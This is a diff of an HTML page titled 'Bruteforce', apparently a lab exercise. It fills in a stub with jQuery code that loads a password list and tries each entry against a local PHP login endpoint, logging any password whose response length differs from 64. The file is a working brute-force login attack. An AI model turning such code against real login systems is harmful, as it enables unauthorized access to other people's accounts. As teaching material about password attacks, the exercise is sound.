@@ -1,16 +1,40 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<title>Bruteforce</title>
-	<script type="text/javascript" src='https://code.jquery.com/jquery-3.1.0.min.js'></script>
+    <title>Bruteforce</title>
+    <script type="text/javascript" src='https://code.jquery.com/jquery-3.1.0.min.js'></script>
 </head>
+
 <body>
 
-<script>
-// CODE HERE
-//  	let post = $.ajax({  	});
+    <script>
+        $(document).ready(function() {
+            $.ajax({
+                type: "GET",
+                url: "/PHP/BruteForce/force/password.php",
+                dataType: "json", // Set the data type so jQuery can parse it for you
+                success: function(data) {
+                    $.each(data, function(key, value) {
+                        $.ajax({
+                            type: "GET",
+                            url: "/PHP/BruteForce/bruteforce/index.php",
+                            data: 'password=' + value,
+                            success: function(res) {
+                                if (res.length != 64) {
+                                    console.log(value);
+                                }
+                            }
+                        });
+                    });
+                }
+            });
 
-  	
-</script>
+        });
+
+    </script>
+
+    <div id="test"></div>
 </body>
+
 </html>
